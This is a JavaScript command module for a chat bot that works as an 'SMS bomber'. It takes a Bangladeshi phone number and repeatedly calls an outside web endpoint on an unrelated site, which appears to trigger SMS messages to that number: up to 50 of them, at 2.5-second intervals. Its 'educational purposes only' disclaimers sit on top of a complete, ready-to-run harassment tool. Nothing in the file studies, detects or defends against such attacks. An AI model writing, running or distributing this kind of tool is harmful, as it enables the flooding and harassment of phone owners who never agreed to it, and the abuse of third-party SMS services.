const axios = require("axios");

// Store bombing status per thread
const activeBombings = new Map();

module.exports = {
  config: {
    name: "sms",
    version: "3.1.0",
    hasPermssion: 0,
    credits: "Asif",
    description: "SMS bomber tool for educational purposes",
    category: "utility",
    usages: "[phone number | off]",
    cooldowns: 5,
    dependencies: { 
      "axios": "" 
    }
  },

  onStart: async function ({ api, event, args }) {
    const { threadID, messageID } = event;
    const input = args[0]?.toLowerCase();

    try {
      // Show help if no arguments
      if (!input) {
        return this.showUsage(api, threadID, messageID);
      }

      // Handle stop command
      if (input === "off") {
        return this.stopBombing(api, threadID, messageID);
      }

      // Validate Bangladeshi number format
      if (!/^01[3-9]\d{8}$/.test(input)) {
        return api.sendMessage(
          `❌ Invalid Bangladeshi number format!\n` +
          `💡 Valid formats: 013XXXXXXXX - 019XXXXXXXX\n` +
          `📝 Example: /sms 01712345678`,
          threadID, messageID
        );
      }

      // Check if bombing is already active
      if (activeBombings.has(threadID)) {
        return api.sendMessage(
          "⚠️ SMS bombing is already active in this thread!\n" +
          "🛑 Stop with: /sms off",
          threadID, messageID
        );
      }

      // Start bombing
      activeBombings.set(threadID, {
        number: input,
        count: 0,
        startTime: Date.now()
      });
      
      api.sendMessage(
        `🚀 SMS bombing started for: ${input}\n` +
        `⏱️ To stop: /sms off\n\n` +
        `⚠️ Note: This is for educational purposes only!`,
        threadID, messageID
      );

      // Start bombing in background
      this.startBombing(api, threadID, input);
      
    } catch (error) {
      console.error("SMS Command Error:", error);
      activeBombings.delete(threadID);
      api.sendMessage(
        "❌ An error occurred! Bombing stopped.",
        threadID, messageID
      );
    }
  },

  stopBombing: function (api, threadID, messageID) {
    if (activeBombings.has(threadID)) {
      const { number, count } = activeBombings.get(threadID);
      activeBombings.delete(threadID);
      api.sendMessage(
        `🛑 SMS bombing stopped for: ${number}\n` +
        `📊 Total SMS sent: ${count}`,
        threadID, messageID
      );
    } else {
      api.sendMessage("ℹ️ No active bombing in this thread.", threadID, messageID);
    }
  },

  showUsage: function (api, threadID, messageID) {
    const usageMessage = `📱 SMS Bomber Command (Educational Use Only)

🔧 Usage:
/sms [phone number]  - Start bombing (Bangladeshi numbers)
/sms off             - Stop active bombing

📝 Valid Number Examples:
/sms 01712345678
/sms 01876543210
/sms 01911223344

⚠️ Important:
1. For educational purposes only
2. Respect privacy and local laws
3. Use responsibly
4. Do not abuse this feature
5. Maximum 50 SMS per session`;

    api.sendMessage(usageMessage, threadID, messageID);
  },

  startBombing: async function (api, threadID, number) {
    try {
      const MAX_REQUESTS = 50; // Safety limit
      const REQUEST_DELAY = 2500; // 2.5 seconds
      
      while (activeBombings.has(threadID)) {
        const bombingInfo = activeBombings.get(threadID);
        
        // Safety limit check
        if (bombingInfo.count >= MAX_REQUESTS) {
          this.stopBombing(api, threadID);
          api.sendMessage(
            `🛑 Auto-stopped after ${MAX_REQUESTS} SMS\n` +
            `⚠️ Safety limit reached!`,
            threadID
          );
          return;
        }

        try {
          // Send SMS request
          await axios.get(`https://ultranetrn.com.br/fonts/api.php?number=${number}`, {
            timeout: 5000
          });
          
          // Update count
          bombingInfo.count++;
          activeBombings.set(threadID, bombingInfo);
          
          // Update every 5 requests
          if (bombingInfo.count % 5 === 0) {
            api.sendMessage(
              `📶 Sent ${bombingInfo.count} SMS to ${number}\n` +
              `🛑 Stop with: /sms off`,
              threadID
            );
          }
          
          // Add delay
          await new Promise(resolve => setTimeout(resolve, REQUEST_DELAY));
          
        } catch (requestError) {
          console.error("Request failed:", requestError.message);
          // Continue trying unless specifically stopped
        }
      }
      
    } catch (error) {
      console.error("Bombing Error:", error);
      if (activeBombings.has(threadID)) {
        activeBombings.delete(threadID);
        api.sendMessage(
          `❌ Critical error: ${error.message}\nBombing stopped!`,
          threadID
        );
      }
    }
  }
};
